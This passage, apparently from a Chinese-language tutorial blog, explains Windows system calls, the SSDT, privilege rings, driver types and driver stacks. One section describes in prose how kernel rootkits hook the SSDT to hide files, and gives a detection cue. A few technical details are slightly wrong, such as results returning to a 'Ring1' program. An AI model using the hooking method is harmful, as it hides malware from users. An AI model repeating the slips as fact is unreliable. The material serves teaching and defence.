&lt;/h4&gt;&lt;p&gt;分别用于解析和执行 JScript 和 VBScript 脚本的引擎&lt;/p&gt;
&lt;p&gt;当&lt;code&gt;wscript.exe&lt;/code&gt;或&lt;code&gt;mshta.exe&lt;/code&gt;等脚本执行进程加载它们时，表明有相应的脚本正在运行&lt;/p&gt;
&lt;h1 id=&#34;系统调用&#34;&gt;系统调用
&lt;/h1&gt;&lt;h2 id=&#34;什么是系统调用&#34;&gt;什么是系统调用
&lt;/h2&gt;&lt;p&gt;系统调用是运行在用户模式 (UserMode/Ring3) 的应用程序，向操作系统内核 (KernelMode / Ring0) 请求服务或资源的唯一、规范化的接口&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是操作系统为了保护自身稳定性和安全性而设定的核心机制&lt;/strong&gt;，应用程序不能随心所欲地直接访问硬件或关键内存，所有这些敏感操作都必须通过系统调用，以一种受控的方式“委托”给内核来完成&lt;/p&gt;
&lt;h2 id=&#34;系统调用工作过程&#34;&gt;系统调用工作过程
&lt;/h2&gt;&lt;h3 id=&#34;准备阶段&#34;&gt;准备阶段
&lt;/h3&gt;&lt;p&gt;用户模式的应用程序（例如&lt;code&gt;notepad.exe&lt;/code&gt;）准备调用一个Win32API函数，比如 &lt;code&gt;WriteFile&lt;/code&gt;，&lt;code&gt;WriteFile&lt;/code&gt; 函数本身位于&lt;code&gt;kernel32.dll&lt;/code&gt;中&lt;/p&gt;
&lt;h3 id=&#34;中介阶段&#34;&gt;中介阶段
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;kernel32.dll&lt;/code&gt;中的&lt;code&gt;WriteFile&lt;/code&gt;函数并不会直接执行写文件操作，它是一个包装函数&lt;/p&gt;
&lt;p&gt;它会把真正的写文件操作对应的系统调用编号（比如写文件的&lt;code&gt;NtWriteFile&lt;/code&gt; 的编号）放入CPU的&lt;code&gt;EAX&lt;/code&gt;寄存器中，并将其他参数（如文件句柄、数据缓冲区等）放入其他指定的寄存器&lt;/p&gt;
&lt;h3 id=&#34;切换阶段&#34;&gt;切换阶段
&lt;/h3&gt;&lt;p&gt;准备好之后，&lt;code&gt;ntdll.dll&lt;/code&gt;中的代码会执行一条特殊的CPU指令，例如&lt;code&gt;SYSCALL&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;特权级转换&#34;&gt;特权级转换
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;SYSCALL&lt;/code&gt;指令会使CPU立即从用户模式切换到内核模式，并将控制权交给内核中一个预设好的系统调用总处理程序&lt;/p&gt;
&lt;h3 id=&#34;派阶段&#34;&gt;派阶段
&lt;/h3&gt;&lt;p&gt;内核的总处理程序接管控制权后，会查看&lt;code&gt;EAX&lt;/code&gt;寄存器中的系统调用编号，然后利用这个编号去&lt;strong&gt;SSDT&lt;/strong&gt;中查找对应的内核函数地址&lt;/p&gt;
&lt;h3 id=&#34;执行阶段&#34;&gt;执行阶段
&lt;/h3&gt;&lt;p&gt;找到地址后，内核会跳转到该地址（例如内核中的&lt;code&gt;NtWriteFile&lt;/code&gt;函数）去执行真正的文件写入操作&lt;/p&gt;
&lt;h3 id=&#34;返回阶段&#34;&gt;返回阶段
&lt;/h3&gt;&lt;p&gt;内核函数执行完毕后，会将结果返回，CPU 再从内核模式切换回用户模式，应用程序继续执行&lt;/p&gt;
&lt;h2 id=&#34;ssdt&#34;&gt;SSDT
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;SSDT 的全称是System Service Dispatch Table（系统服务分派表）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它就是我们在上面流程中提到的那个函数地址查询表，它是一个存放在内核内存中的数组，数组的每一个元素都是一个函数指针，指向了实现具体系统调用的内核函数的内存地址&lt;/p&gt;
&lt;p&gt;当系统调用发生时，内核就是通过&lt;code&gt;系统调用编号&lt;/code&gt;作为索引，在这个 SSDT 数组中找到并调用正确的内核函数&lt;/p&gt;
&lt;h2 id=&#34;ssdthook&#34;&gt;SSDThook
&lt;/h2&gt;&lt;p&gt;由于 SSDT 是所有关键操作的必经之路，它成为了内核级 Rootkit 的首要攻击目标&lt;/p&gt;
&lt;p&gt;Rootkit（通常是一个恶意的&lt;code&gt;.sys&lt;/code&gt;驱动）会获取到 SSDT 在内存中的地址，然后用自己的恶意函数地址，去覆盖表中某个正常系统函数的地址&lt;/p&gt;
&lt;p&gt;比如一个文件隐藏Rootkit，可能会用自己的&lt;code&gt;HookedNtQueryDirectoryFile&lt;/code&gt;函数地址，替换掉SSDT中原始的 &lt;code&gt;NtQueryDirectoryFile&lt;/code&gt;（用于列出目录内容）的地址&lt;/p&gt;
&lt;p&gt;此后，当任何程序（包括 &lt;code&gt;explorer.exe&lt;/code&gt;）尝试列出目录内容时，系统调用都会被重定向到这个恶意的 &lt;code&gt;HookedNtQueryDirectoryFile&lt;/code&gt;函数这个恶意函数会先获取原始的目录列表，然后将其中所有与Rootkit自身相关的恶意文件名都过滤掉，最后再将一个“干净”的列表返回给应用程序，这样，用户就永远无法看到这些恶意文件了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果一个函数的地址指向的不是官方的 &lt;code&gt;ntoskrnl.exe&lt;/code&gt; (或 &lt;code&gt;win32k.sys&lt;/code&gt;)，而是指向了一个第三方的、可疑的驱动文件，那么就意味着SSDT已被劫持&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;系统用的分类&#34;&gt;系统用的分类
&lt;/h2&gt;&lt;h3 id=&#34;进程与线程管理&#34;&gt;进程与线程管理
&lt;/h3&gt;&lt;h4 id=&#34;ntcreateprocess&#34;&gt;NtCreateProcess
&lt;/h4&gt;&lt;p&gt;创建一个新进程&lt;/p&gt;
&lt;h4 id=&#34;ntterminateprocess&#34;&gt;NtTerminateProcess
&lt;/h4&gt;&lt;p&gt;终止一个进程&lt;/p&gt;
&lt;h4 id=&#34;ntcreatethread&#34;&gt;NtCreateThread
&lt;/h4&gt;&lt;p&gt;创建一个新线程&lt;/p&gt;
&lt;h4 id=&#34;ntopenprocess&#34;&gt;NtOpenProcess
&lt;/h4&gt;&lt;p&gt;打开一个已存在进程的句柄&lt;/p&gt;
&lt;h3 id=&#34;文件与-io-操作&#34;&gt;文件与 I/O 操作
&lt;/h3&gt;&lt;h4 id=&#34;ntcreatefile&#34;&gt;NtCreateFile
&lt;/h4&gt;&lt;p&gt;创建或打开一个文件&lt;/p&gt;
&lt;h4 id=&#34;ntreadfile&#34;&gt;NtReadFile
&lt;/h4&gt;&lt;p&gt;从文件中读取数据&lt;/p&gt;
&lt;h4 id=&#34;ntwritefile&#34;&gt;NtWriteFile
&lt;/h4&gt;&lt;p&gt;向文件中写入数据&lt;/p&gt;
&lt;h4 id=&#34;ntdeviceiocontrolfile&#34;&gt;NtDeviceIoControlFile
&lt;/h4&gt;&lt;p&gt;向设备驱动发送控制命令&lt;/p&gt;
&lt;h3 id=&#34;注册表操作&#34;&gt;注册表操作
&lt;/h3&gt;&lt;h4 id=&#34;ntopenkey&#34;&gt;NtOpenKey
&lt;/h4&gt;&lt;p&gt;打开一个注册表项&lt;/p&gt;
&lt;h4 id=&#34;ntqueryvaluekey&#34;&gt;NtQueryValueKey
&lt;/h4&gt;&lt;p&gt;查询一个注册表键值的数据&lt;/p&gt;
&lt;h4 id=&#34;ntsetvaluekey&#34;&gt;NtSetValueKey
&lt;/h4&gt;&lt;p&gt;设置一个注册表键值的数据&lt;/p&gt;
&lt;h3 id=&#34;内存管理&#34;&gt;内存管理
&lt;/h3&gt;&lt;h4 id=&#34;ntallocatevirtualmemory&#34;&gt;NtAllocateVirtualMemory
&lt;/h4&gt;&lt;p&gt;在进程的虚拟地址空间中分配内存&lt;/p&gt;
&lt;h4 id=&#34;ntprotectvirtualmemory&#34;&gt;NtProtectVirtualMemory
&lt;/h4&gt;&lt;p&gt;修改内存页的保护属性（如可读、可写、可执行）&lt;/p&gt;
&lt;h1 id=&#34;驱动&#34;&gt;驱动
&lt;/h1&gt;&lt;h2 id=&#34;什么是驱动&#34;&gt;什么是驱动
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;驱动程序（Driver）是一个软件组件，它充当了操作系统内核与物理硬件或虚拟设备之间的通信桥梁&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当应用程序需要与硬件（如打印机、网卡、磁盘）交互时，它会向操作系统发出一个通用请求&lt;/p&gt;
&lt;p&gt;操作系统内核的I/O管理器接收到这个请求后，不会直接与硬件对话，而是将请求打包成&lt;strong&gt;IRP请求&lt;/strong&gt;转发给相应的驱动程序&lt;/p&gt;
&lt;p&gt;驱动程序负责将这个标准化的请求翻译成硬件能够理解的特定指令，并与硬件通信&lt;/p&gt;
&lt;h2 id=&#34;cpu的特权级别&#34;&gt;CPU的特权级别
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;在了解驱动文件之前，我们得先知道x86架构CPU的四个特权级别&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;特权级别在x86架构中也被称为保护环（Protection Rings），是CPU硬件层面实现的一种访问控制机制&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;x86架构定义了四个特权级别，从Ring0到Ring3，数字越小，代表权限越高&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;ring-0-内核态kernel-mode&#34;&gt;Ring 0: 内核态（Kernel Mode）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;权限：最高&lt;/strong&gt;。运行在Ring0的代码可以执行 CPU 的所有指令集，并能直接访问任何内存地址、I/O端口和硬件设备&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;运行实体: 操作系统内核本身&lt;/strong&gt;。例如&lt;code&gt;ntoskrnl.exe&lt;/code&gt;和绝大多数设备驱动程序(&lt;code&gt;.sys&lt;/code&gt; 文件)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这是操作系统的核心，负责管理系统所有资源，包括进程调度、内存管理、I/O 控制等&lt;/p&gt;
&lt;p&gt;如果Ring0的代码崩溃，整个系统将立即蓝屏（BSOD）或宕机（Kernel Panic）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ring-1--ring-2-准核心态驱动层rarely-used&#34;&gt;Ring 1 &amp;amp; Ring 2: 准核心态/驱动层（Rarely Used）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;权限：介于内核态和用户态之间&lt;/strong&gt;。它们拥有比Ring3更高的权限（例如可以访问更多的 I/O 端口），但又不像Ring0那样拥有对系统的完全控制权&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;运行实体&lt;/strong&gt;: 在理论设计上，Ring1可以用于运行一些准系统级的服务，而Ring2可以用于运行设备驱动程序，从而将驱动与最核心的内核隔离开，增加系统的稳定性（即驱动崩溃不至于让整个内核崩溃）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;它几乎从未被主流消费级和服务器级操作系统（如 Windows, Linux, macOS）所使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这些操作系统普遍采用了更简单的两级模型，即只使用Ring0和Ring3&lt;/p&gt;
&lt;p&gt;这是因为在Ring1/2和Ring0之间切换上下文的开销，以及复杂的内存管理，并没有带来足够的安全收益来抵消其复杂性&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ring-3-用户态user-mode&#34;&gt;Ring 3: 用户态（User Mode）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;权限&lt;/strong&gt;：&lt;strong&gt;最低&lt;/strong&gt;。运行在Ring3的代码受到硬件的严格限制，它不能直接访问硬件，也不能访问属于内核或其他进程的受保护内存空间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;运行实体&lt;/strong&gt;：&lt;strong&gt;所有的应用程序&lt;/strong&gt;。例如浏览器 、记事本、游戏等，都运行在Ring3&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这是应用程序的沙箱，当一个Ring3的程序需要执行特权操作时（如读取文件），它不能直接去操作硬盘，而是必须通过一个名为系统调用的受控入口，向Ring0的内核提出请求&lt;/p&gt;
&lt;p&gt;内核会对请求进行验证，然后以Ring0的权限代为执行，再将结果返回给Ring1的程序&lt;/p&gt;
&lt;p&gt;这个过程确保了所有对关键资源的访问都在内核的掌控之下&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;驱动的文件形式&#34;&gt;驱动的文件形式
&lt;/h2&gt;&lt;h3 id=&#34;sys文件&#34;&gt;.sys文件
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是最传统、最核心、权限最高的驱动程序形式，是真正的驱动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它们是专门为在操作系统内核（Ring0）中运行而编译的，可以直接与硬件和内核数据结构交互&lt;/p&gt;
&lt;p&gt;几乎所有核心的硬件驱动，如磁盘驱动&lt;code&gt;ntfs.sys&lt;/code&gt;、网络驱动&lt;code&gt;tcpip.sys&lt;/code&gt;等，都是&lt;code&gt;.sys&lt;/code&gt;文件&lt;/p&gt;
&lt;h3 id=&#34;dll文件&#34;&gt;.dll文件
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;它们有的情况下是驱动组件，但大多数不是传统驱动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为了提高系统的稳定性和安全性，微软引入了用户模式驱动框架 (User-Mode Driver Framework, UMDF)&lt;/p&gt;
&lt;p&gt;一些对性能要求不是极致、但对稳定性要求很高的设备（如扫描仪、打印机、传感器等）的驱动，可以被实现为DLL文件&lt;/p&gt;
&lt;p&gt;这些驱动DLL运行在权限受限的用户模式（Ring3），并由一个系统进程（通常是&lt;code&gt;svchost.exe&lt;/code&gt;）作为“宿主”来加载和运行&lt;/p&gt;
&lt;h2 id=&#34;驱动程序的分类&#34;&gt;驱动程序的分类
&lt;/h2&gt;&lt;h3 id=&#34;按运行模式分类&#34;&gt;按运行模式分类
&lt;/h3&gt;&lt;h4 id=&#34;内核模式驱动程序&#34;&gt;内核模式驱动程序
&lt;/h4&gt;&lt;p&gt;这是最常见的类型，运行在操作系统的核心层 (Ring 0)，拥有最高权限&lt;/p&gt;
&lt;p&gt;它们可以直接与硬件通信，是系统运行的基石&lt;/p&gt;
&lt;h4 id=&#34;用户模式驱动程序&#34;&gt;用户模式驱动程序
&lt;/h4&gt;&lt;p&gt;运行在权限受限的用户模式 (Ring3) 下，安全性更高&lt;/p&gt;
&lt;p&gt;如果这类驱动程序崩溃，不会导致整个系统蓝屏&lt;/p&gt;
&lt;h3 id=&#34;按功能层次分类&#34;&gt;按功能层次分类
&lt;/h3&gt;&lt;h4 id=&#34;总线驱动程序&#34;&gt;总线驱动程序
&lt;/h4&gt;&lt;p&gt;位于驱动栈的最底层，负责枚举挂载在总线（如 PCI, USB）上的所有设备&lt;/p&gt;
&lt;h4 id=&#34;功能驱动程序&#34;&gt;功能驱动程序
&lt;/h4&gt;&lt;p&gt;驱动栈的核心，通常由硬件厂商编写，负责实现设备的具体I/O功能&lt;/p&gt;
&lt;h4 id=&#34;筛选驱动程序&#34;&gt;筛选驱动程序
&lt;/h4&gt;&lt;p&gt;可以附加在功能驱动程序之上或之下，用于“过滤”或“修改”流经该设备的 I/O 请求&lt;/p&gt;
&lt;p&gt;杀毒软件的文件实时监控、磁盘加密软件等，通常就是通过它来实现的&lt;/p&gt;
&lt;h2 id=&#34;常见的核心系统驱动&#34;&gt;常见的核心系统驱动
&lt;/h2&gt;&lt;h3 id=&#34;内核核心模块&#34;&gt;内核核心模块
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;不是传统驱动，但居于内核中心&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;ntoskrnlexe&#34;&gt;ntoskrnl.exe
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;它是操作系统内核本身，是所有内核活动的核心&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以把它理解为&lt;strong&gt;驱动管理器&lt;/strong&gt;和&lt;strong&gt;最根本的驱动&lt;/strong&gt;，虽然它实际上并非严格意义上的设备驱动&lt;/p&gt;
&lt;p&gt;在系统启动时，&lt;code&gt;ntoskrnl.exe&lt;/code&gt;会加载一系列其它核心模块（DLL 和 SYS）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;hal.dll&lt;/code&gt;：硬件抽象层（HAL）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kdcom.dll&lt;/code&gt;：内核调试通信&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bootvid.dll&lt;/code&gt;、&lt;code&gt;ci.dll&lt;/code&gt;：安全校验、驱动签名&lt;/li&gt;
&lt;li&gt;各类驱动程序：&lt;code&gt;acpi.sys&lt;/code&gt;、&lt;code&gt;tcpip.sys&lt;/code&gt;、&lt;code&gt;disk.sys&lt;/code&gt;等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;它是整个内核态模块的中枢，所有其他的驱动程序都需要在它提供的框架内运行，并由它来管理和调度&lt;/p&gt;
&lt;h3 id=&#34;内核支持模块&#34;&gt;内核支持模块
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;DLL类内核组件，没有设备对象，也不处理IRP，不是传统驱动，但运行在内核态，是 OS 的底层模块&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;haldll&#34;&gt;hal.dll
&lt;/h4&gt;&lt;p&gt;硬件抽象层，屏蔽不同主板和 CPU 的差异，为内核提供统一接口&lt;/p&gt;
&lt;h4 id=&#34;kdcomdll&#34;&gt;kdcom.dll
&lt;/h4&gt;&lt;p&gt;内核调试通信模块，用于系统调试时与调试器通信&lt;/p&gt;
&lt;h4 id=&#34;cidll&#34;&gt;ci.dll
&lt;/h4&gt;&lt;p&gt;负责代码完整性校验与驱动签名验证&lt;/p&gt;
&lt;h4 id=&#34;bootviddll&#34;&gt;bootvid.dll
&lt;/h4&gt;&lt;p&gt;开机阶段的简易显示输出，属于引导组件&lt;/p&gt;
&lt;h3 id=&#34;内核设备驱动程序&#34;&gt;内核设备驱动程序
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;是真正严格意义上的驱动&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;tcpipsys&#34;&gt;tcpip.sys
&lt;/h4&gt;&lt;p&gt;负责TCP/IP协议栈的核心驱动，处理所有网络数据包的收发。属于网络类驱动的代表&lt;/p&gt;
&lt;h4 id=&#34;ntfssys&#34;&gt;ntfs.sys
&lt;/h4&gt;&lt;p&gt;NTFS 文件系统的核心驱动，负责硬盘上所有文件的读写和管理&lt;/p&gt;
&lt;p&gt;它实现了文件系统层的功能，如读写文件、挂载卷等&lt;/p&gt;
&lt;h4 id=&#34;acpisys&#34;&gt;acpi.sys
&lt;/h4&gt;&lt;p&gt;负责高级配置与电源管理接口（ACPI），处理系统电源管理事件，如休眠、唤醒、电源按钮等&lt;/p&gt;
&lt;p&gt;它属于系统级别的 ACPI 驱动&lt;/p&gt;
&lt;h4 id=&#34;partmgrsys&#34;&gt;partmgr.sys
&lt;/h4&gt;&lt;p&gt;管理磁盘的分区结构&lt;/p&gt;
&lt;h4 id=&#34;storportsys&#34;&gt;storport.sys
&lt;/h4&gt;&lt;p&gt;提供与存储控制器（如 SATA、SCSI 控制器）之间的通信通道&lt;/p&gt;
&lt;h4 id=&#34;disksys&#34;&gt;disk.sys
&lt;/h4&gt;&lt;p&gt;硬盘设备驱动，处理底层磁盘I/O请求&lt;/p&gt;
&lt;p&gt;它与&lt;code&gt;partmgr.sys&lt;/code&gt;、&lt;code&gt;storport.sys&lt;/code&gt;等共同构建块设备访问层&lt;/p&gt;
&lt;h3 id=&#34;输入与图形类驱动&#34;&gt;输入与图形类驱动
&lt;/h3&gt;&lt;h4 id=&#34;kbdclasssysmouclasssys&#34;&gt;kbdclass.sys/mouclass.sys
&lt;/h4&gt;&lt;p&gt;键盘和鼠标的类驱动程序，负责处理来自这些输入设备的通用请求&lt;/p&gt;
&lt;p&gt;它不直接与硬件通信，而是接收底层端口驱动（如&lt;code&gt;i8042prt.sys&lt;/code&gt;）上传的输入数据&lt;/p&gt;
&lt;h4 id=&#34;dxgkrnlsys&#34;&gt;dxgkrnl.sys
&lt;/h4&gt;&lt;p&gt;DirectX图形内核驱动，是Windows显示驱动模型（WDDM）的核心，负责与GPU交互、调度图形任务&lt;/p&gt;
&lt;h3 id=&#34;驱动开发支持框架模块&#34;&gt;驱动开发支持框架模块
&lt;/h3&gt;&lt;h4 id=&#34;wdf01000sys&#34;&gt;Wdf01000.sys
&lt;/h4&gt;&lt;p&gt;Windows驱动程序框架（WDF）的一部分，是KMDF驱动的运行时组件，为许多现代驱动提供了统一的驱动模型支持&lt;/p&gt;
&lt;h4 id=&#34;wdfldrsys&#34;&gt;WdfLdr.sys
&lt;/h4&gt;&lt;p&gt;WDF加载器，负责驱动初始化&lt;/p&gt;
&lt;h4 id=&#34;winusbsys&#34;&gt;WinUsb.sys
&lt;/h4&gt;&lt;p&gt;WDF提供的USB驱动支持&lt;/p&gt;
&lt;h2 id=&#34;驱动栈&#34;&gt;驱动栈
&lt;/h2&gt;&lt;h3 id=&#34;什么是驱动栈&#34;&gt;什么是驱动栈
&lt;/h3&gt;&lt;p&gt;当用户在用户层发出一个文件读写请求时，比如&lt;code&gt;ReadFile(&amp;quot;D:\\example.txt&amp;quot;)&lt;/code&gt;，这个请求并不是直接送到硬盘，而是要经过多个驱动程序处理，每个驱动做自己的那一部分&lt;/p&gt;
&lt;p&gt;这种结构就叫驱动栈&lt;/p&gt;
&lt;h3 id=&#34;驱动栈的结构&#34;&gt;驱动栈的结构
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;下面是一个典型的Windows 存储驱动栈：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntfs.sys（文件系统驱动）         ← 顶层（用户文件访问）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;volmgr.sys（卷管理器驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;partmgr.sys（分区管理器驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disk.sys（磁盘驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;storport.sys（存储端口驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（存储控制器驱动） ← 底层（控制硬件）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;驱动栈工作过程&#34;&gt;驱动栈工作过程
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;应用程序发起 I/O 请求&lt;/strong&gt;
用户程序调用&lt;code&gt;ReadFile()&lt;/code&gt;或&lt;code&gt;WriteFile()&lt;/code&gt;等API，也就是进行了涉及请求访问硬件或设备的系统调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件系统驱动处理&lt;/strong&gt;
&lt;code&gt;ntfs.sys&lt;/code&gt;解析文件路径、权限等，将文件操作转换为卷层面的块设备请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;卷管理器驱动处理&lt;/strong&gt;
&lt;code&gt;volmgr.sys&lt;/code&gt;管理逻辑卷，确定具体的物理磁盘分区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分区管理器驱动处理&lt;/strong&gt;
&lt;code&gt;partmgr.sys&lt;/code&gt;负责管理磁盘分区表，转发请求到正确的物理分区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;磁盘驱动处理&lt;/strong&gt;
&lt;code&gt;disk.sys&lt;/code&gt;负责和物理磁盘设备交互，生成适合硬件的请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;存储端口驱动处理&lt;/strong&gt;
&lt;code&gt;storport.sys&lt;/code&gt;是与存储控制器通信的中间层，负责协议和请求队列管理&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;迷你端口驱动处理&lt;/strong&gt;
由硬件厂商编写，具体实现与存储控制器硬件的交互&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;硬件执行请求&lt;/strong&gt;
最终请求被硬件执行，数据被读写&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这个过程中，每一层都可以&lt;strong&gt;处理请求、修改请求、拦截请求&lt;/strong&gt;，层层检查&lt;/p&gt;
&lt;h3 id=&#34;其它类型的驱动栈&#34;&gt;其它类型的驱动栈
&lt;/h3&gt;&lt;p&gt;除了存储，还有很多其他的驱动栈：&lt;/p&gt;
&lt;h4 id=&#34;usb-驱动栈简化&#34;&gt;USB 驱动栈（简化）：
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usbhub.sys（USB集线器驱动）      ← 顶层（最高层）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usbccgp.sys（通用USB类驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;winusb.sys（用户模式USB驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usbport.sys（USB端口驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（控制器驱动）   ← 底层（最接近硬件）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;网络驱动栈ndis&#34;&gt;网络驱动栈（NDIS）：
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpip.sys（TCP/IP 协议驱动）      ← 顶层（协议层）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ndis.sys（NDIS 中间层驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（网卡驱动）        ← 底层（硬件驱动）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;显示设备驱动栈windows显示驱动模型wddm&#34;&gt;显示设备驱动栈（Windows显示驱动模型WDDM）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dxgkrnl.sys（DirectX 图形内核驱动）  ← 顶层（图形API接口）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;display.sys（显示驱动核心）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
